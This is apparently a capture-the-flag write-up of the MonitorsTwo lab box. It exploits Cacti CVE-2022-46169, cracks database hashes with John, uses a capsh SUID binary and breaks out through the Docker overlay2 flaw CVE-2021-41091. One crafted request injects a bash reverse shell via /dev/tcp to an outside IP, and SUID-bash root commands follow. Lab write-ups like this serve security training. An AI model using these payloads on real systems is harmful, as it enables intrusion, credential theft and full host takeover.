+++
date = '2026-08-20T22:49:33+02:00'
draft = false
title = 'MonitorsTwo Writeup EN'
+++
**Author**: **`joy.scd01`**

**Date**: **`22/08/2026`**

![pwn.png](/images/imgs_monitors2/pwn.png)

---
# Introduction

**_MonitorsTwo_** is an **Easy-level Linux** box that serves as a spiritual sequel to **Monitors**, keeping the focus on **Cacti** and **Docker** but featuring a much more linear exploitation path.

The initial foothold leverages an **Unauthenticated Command Injection** on **Cacti**, which grants us access inside a container. After enumerating the database and extracting credentials to get an **SSH** session on the host, the real challenge shifts to Privilege Escalation. This requires a double jump: first escalating to **root** inside the container by exploiting an anomalous **SUID** binary, and then breaking out to the host by abusing **CVE-2021-41091**, which affects **Docker**'s overlay2 directories.

---
# Techniques Used

- **Cacti Unauthenticated Command Injection (CVE-2022-46169)**

- **Metasploit for Debugging & Param Enumeration**

- **Database Credential Extraction & Cracking**

- **Docker Container Root via SUID (capsh)**

- **Moby/Docker Overlay2 Privilege Escalation (CVE-2021-41091)**

---
# Enumeration

## nmap

Initial scan on all ports:

```bash
nmap -p- monitors2
```
```text
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Targeted scan with scripts and version detection:

```bash
nmap -sC -sV monitors2
```

```text
PORT     STATE    SERVICE VERSION
22/tcp   open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp   open     http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Login to Cacti
179/tcp  filtered bgp
9502/tcp filtered unknown
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**Open ports**:

- **22**/tcp - SSH

- **80**/tcp - HTTP

## Web Enumeration

Visiting the website on port 80, I was greeted by a **Cacti** login page. The version was clearly exposed: **`1.2.22`**.

![web1.png](/images/imgs_monitors2/web1.png)

I immediately searched for known exploits:

```bash
searchsploit cacti 1.2.22
```

![scsploit1.png](/images/imgs_monitors2/scsploit1.png)

The search revealed the **CVE-2022-46169**.

**Note**: _This is a critical **Unauthenticated Command Injection** vulnerability. To exploit it, an attacker needs to bypass the authorization check (often by spoofing the **`X-Forwarded-For`** header with the local IP) and inject commands via the **`poller_id`** parameter of the **`remote_agent.php`** endpoint. 

---
# Initial Access | Cacti Command Injection (Manual)

I found a public exploit script for this vulnerability, but for some reason, it didn't work. The script was bruteforcing the **`host_id`** and **`local_data_ids`** parameters in a range from **0** to **100**. 

![script.png](/images/imgs_monitors2/script.png)

I tried playing with those parameters myself, but I didn't completely understand what was failing, and I wasn't able to obtain a shell.

I searched for other **PoC**s, but none of them worked or taught me anything new. However, I read about a dedicated **Metasploit** module.
I fired up **msfconsole** and searched for it:

```bash
exploit(linux/http/cacti_unauthenticated_cmd_injection)
```

I set up the options and ran it. It successfully returned a shell. But more importantly, it revealed exactly where the vulnerability was triggered, giving me the correct parameters: **`host_id=1`** and **`local_data_id[]=6`**.

![msf.png](/images/imgs_monitors2/msf.png)

Since I like to do things manually, especially because I'm preparing for the **OSCP** certification, I closed the **Metasploit** session and went back to **Burp Suite** to exploit it by hand.

I set up my listener:

```bash
nc -lvnp 22667
```

And I sent this crafted **HTTP** request:

```text
GET /remote_agent.php?action=polldata&local_data_ids[]=6&host_id=1&poller_id=1%3bbash+-c+'bash+-i+>%26+/dev/tcp/10.10.15.152/22667+0>%261' HTTP/1.1
Host: monitors2
X-Forwarded-For: 127.0.0.1
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
```

![burp1.png](/images/imgs_monitors2/burp1.png)

The request went through, and I successfully got a shell as **www-data** inside a **Docker** container.

![initial_access.png](/images/imgs_monitors2/initial_access.png)

---
# Lateral Movement | DB Enumeration to SSH

As I usually do when I get access to a web server, I targeted the database. Having just pwned the first **_Monitors_** box, I knew exactly where **Cacti** stores its **DB** configuration:

```bash
cat include/config.php
```

![db_conf.png](/images/imgs_monitors2/db_conf.png)

I tried connecting to the **DB**, but the prompt kept loading endlessly. The issue was my shell, which wasn't fully interactive. I tried to upgrade it using **Python**, but it wasn't installed in this container.

So, I used the **script** command to bypass the issue:

```bash
script /dev/null -c bash
```

After that, I connected to **MySQL** without issues:

```bash
mysql -h db -u root -p
```

And I retrieved two hashes for the users **admin** and **marcus**:

```sql
show databases;
use cacti;
show tables;
select * from user_auth;
```

![hash.png](/images/imgs_monitors2/hash.png)

I saved these hashes into a text file and fed them to **John The Ripper**:

```bash
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

![john.png](/images/imgs_monitors2/john.png)

The password for **marcus** cracked quickly. I used it to **SSH** into the host machine and grabbed the **user flag**.

```bash
cat user.txt
```

![lateral.png](/images/imgs_monitors2/lateral.png)

---
# Privilege Escalation | Container Breakout via Overlay2

Right after **SSH**-ing into the box, the **MOTD** (**Message of the Day**) hinted that the user **marcus** had some emails.

I went to check the **mail** spool:

```bash
ls -lha /var/spool/mail
cat /var/spool/mail/marcus
```

The email contained a security bulletin mentioning three critical vulnerabilities:

- **CVE-2021-33033 (Linux kernel before 5.11.14)**

- **CVE-2020-25706 (Cacti XSS)**

- **CVE-2021-41091 (Moby / Docker Engine overlay2 permissions)**

Since I already had access to a container and the first machine (**_Monitors_**) involved a container breakout, I decided to analyze the last **CVE** first.

- **Source**: https://github.com/UncleJ4ck/CVE-2021-41091

**Note**: _**CVE-2021-41091** is a vulnerability that allows unprivileged **Linux** users to traverse and execute programs within the **Docker** data directory (**`overlay2`**) due to insufficiently restricted permissions. Simply put: if we can place a **SUID** binary inside the container, we can navigate from the host's file system to that container's physical folder and execute it to become **root** on the host._

To test it, I created a dummy file inside the **`/tmp`** dir of the **Docker** container. From the **marcus** shell (on the host), I used **`findmnt`** to reveal the physical path of the container, and an **`ls -lha`** confirmed I could see the newly created file. The vulnerability was confirmed.

![conts.png](/images/imgs_monitors2/conts.png)

The problem now was that I had to escalate privileges inside the **Docker** container to be able to set **SUID** permissions on a file.
I started manual enumeration inside the container, searching for **SUID** binaries:

```bash
find / -perm -u=s -type f 2>/dev/null
```

![capsh.png](/images/imgs_monitors2/capsh.png)

This command revealed a non-standard binary: **`capsh`**.
Searching on **GTFOBins**, I found the exact payload for exploitation:

- **Source**: https://gtfobins.org/gtfobins/capsh/#shell

```bash
capsh --gid=0 --uid=0 --
```

I was now **root** on the container.

![root_cont.png](/images/imgs_monitors2/root_cont.png)

Next, I had to prepare the trap for the host system. I copied the **`/bin/bash`** binary into the container's **`/tmp`** directory, changed its owner to **root**, and gave it **SUID** permissions:

```bash
cp /bin/bash /tmp
chown root:root bash
chmod 4755 bash
```

Switching back to my **SSH** shell on the host (as **marcus**), I navigated into the container's **overlay2 merged** directory and executed my modified **bash**:

```bash
cd /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged/tmp
./bash -p
```

![rootf.png](/images/imgs_monitors2/rootf.png)

**Pwned**.

---
# Final Thoughts

I think rating this box as **Easy** is the right choice. It definitely has a lot of steps for an easy machine, but technically none of them are overly complex or brain-teasing. It’s a highly educational box, great for reviewing **Docker** file systems, **SUID** binaries, and for training the mindset of manually exploiting vulnerabilities when automated scripts fail.


